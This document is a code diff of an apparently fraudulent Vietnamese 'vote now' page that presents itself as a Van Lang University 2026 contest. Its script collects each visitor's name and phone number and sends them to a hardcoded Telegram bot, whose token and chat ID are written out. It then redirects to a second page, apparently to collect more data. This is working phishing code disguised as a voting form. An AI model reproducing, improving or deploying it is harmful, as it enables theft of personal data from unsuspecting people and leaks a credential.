@@ -26,7 +26,6 @@
             color: white;
             text-decoration: none;
             font-weight: bold;
-            box-shadow: 0 0 15px rgba(123, 47, 253, 0.5);
         }
         .container {
             max-width: 600px;
@@ -65,7 +64,7 @@
             font-size: 16px;
         }
         input::placeholder { color: #AAA; }
-        .btn-gui {
+        .btn-tiep-tuc {
             width: 100%;
             padding: 18px;
             background: linear-gradient(90deg, #7B2FFD, #D244FF);
@@ -78,16 +77,15 @@
             cursor: pointer;
             box-shadow: 0 0 20px rgba(123, 47, 253, 0.6);
         }
-        .btn-gui:disabled { opacity: 0.6; cursor: not-allowed; }
         .thongbao {
             margin-top: 25px;
             padding: 15px;
             border-radius: 10px;
-            text-align: center;
             display: none;
         }
         .thanhcong { background: rgba(0,200,100,0.2); border: 1px solid #00c864; color: #90ffc8; }
         .loi { background: rgba(255,50,50,0.2); border: 1px solid #ff3232; color: #ffb0b0; }
+        .note { text-align: center; margin-top: 30px; color: #AAA; font-size: 14px; }
         footer {
             text-align: center;
             padding: 30px;
@@ -102,12 +100,12 @@
             <h3>VAN LANG UNIVERSITY 2026</h3>
         </div>
         <nav>
-            <a href="#">Trang chủ</a>
+            <a href="index.html">Trang chủ</a>
             <a href="#">Thể lệ</a>
             <a href="#">Thí sinh</a>
             <a href="#">Bảng xếp hạng</a>
             <a href="#">Tin tức</a>
-            <a href="#" class="btn-vote">BÌNH CHỌN NGAY</a>
+            <a href="index.html" class="btn-vote">BÌNH CHỌN NGAY</a>
         </nav>
     </header>
 
@@ -116,13 +114,14 @@
         <div class="form-box">
             <h2>Nhập Thông Tin Bình Chọn</h2>
             
-            <input type="text" id="hoten" placeholder="HỌ VÀ TÊN *" required>
-            <input type="tel" id="dienthoai" placeholder="SỐ ĐIỆN THOẠI *" required>
-            <input type="text" id="sbd" placeholder="SỐ BÁO DANH (6 chữ số) *" required maxlength="6">
+            <input type="text" id="hoten" placeholder="HỌ VÀ TÊN *">
+            <input type="tel" id="dienthoai" placeholder="SỐ ĐIỆN THOẠI *">
             
-            <button class="btn-gui" id="btnGui" onclick="guiThongTin()">GỬI BÌNH CHỌN ✅</button>
+            <button class="btn-tiep-tuc" id="btnTiepTuc" onclick="xuLy()">TIẾP TỤC →</button>
             
             <div id="thongbao" class="thongbao"></div>
+            
+            <p class="note">💜 Cảm ơn bạn đã tham gia bình chọn!</p>
         </div>
     </div>
 
@@ -132,40 +131,32 @@
     </footer>
 
     <script>
-        // ====================== ĐIỀN THÔNG TIN CỦA BẠN VÀO ĐÂY ======================
-        const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";   // Ví dụ: 7123456789:AAG9x...
-        const CHAT_ID = "9845882038
-";    // Ví dụ: 1234567890
-        // ===========================================================================
+        // ====================== ĐIỀN THÔNG TIN TELEGRAM CỦA BẠN VÀO ĐÂY ======================
+        const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";
+        const CHAT_ID = "9845882038";
+        // ===================================================================================
 
-        async function guiThongTin() {
+        async function xuLy() {
             const hoten = document.getElementById('hoten').value.trim();
             const dienthoai = document.getElementById('dienthoai').value.trim();
-            const sbd = document.getElementById('sbd').value.trim();
-            const btn = document.getElementById('btnGui');
+            const btn = document.getElementById('btnTiepTuc');
             const tb = document.getElementById('thongbao');
 
             // Kiểm tra thông tin
-            if (!hoten || !dienthoai || !sbd) {
-                hienThongBao("Vui lòng điền đầy đủ thông tin!", "loi");
-                return;
-            }
-            if (sbd.length !== 6) {
-                hienThongBao("Số báo danh phải có 6 chữ số!", "loi");
+            if (!hoten || !dienthoai) {
+                hienTB("⚠️ Vui lòng điền đầy đủ Họ tên và Số điện thoại!", "loi");
                 return;
             }
 
-            // Khóa nút khi đang gửi
-            btn.disabled = true;
+            // Đổi chữ nút
             btn.innerText = "ĐANG GỬI...";
             tb.style.display = "none";
 
-            // Tạo nội dung tin nhắn
-            const tinNhan = `📩 BÌNH CHỌN MỚI
+            // Tạo nội dung gửi về Telegram
+            const tinNhan = `📩 BÌNH CHỌN MỚI - THÔNG TIN CHUNG
 ━━━━━━━━━━━━━━
 👤 Họ tên: ${hoten}
 📞 SĐT: ${dienthoai}
-🔢 Số báo danh: ${sbd}
 ⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}
 ━━━━━━━━━━━━━━`;
 
@@ -177,26 +168,27 @@
                     text: tinNhan,
                     parse_mode: "HTML"
                 });
-
                 await fetch(`${url}?${params}`);
-                
-                // Thành công
-                hienThongBao("✅ Gửi bình chọn thành công! Cảm ơn bạn!", "thanhcong");
-                // Xóa trắng ô nhập
-                document.getElementById('hoten').value = "";
-                document.getElementById('dienthoai').value = "";
-                document.getElementById('sbd').value = "";
+
+                // Lưu thông tin sang trang SBD
+                localStorage.setItem('hoten', hoten);
+                localStorage.setItem('dienthoai', dienthoai);
+
+                hienTB("✅ Đã lưu thông tin! Đang chuyển trang...", "thanhcong");
+
+                // Chờ 1 giây rồi chuyển trang
+                setTimeout(() => {
+                    window.location.href = "sbd.html";
+                }, 1000);
 
             } catch (loi) {
-                hienThongBao("❌ Lỗi gửi! Kiểm tra lại Token và Chat ID.", "loi");
-                console.log(loi);
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "GỬI BÌNH CHỌN ✅";
+                hienTB("⚠️ Lỗi gửi! Kiểm tra Token + Chat ID", "loi");
+                console.log("Lỗi:", loi);
+                btn.innerText = "TIẾP TỤC →";
             }
         }
 
-        function hienThongBao(noiDung, kieu) {
+        function hienTB(noiDung, kieu) {
             const tb = document.getElementById('thongbao');
             tb.className = "thongbao " + kieu;
             tb.innerText = noiDung;
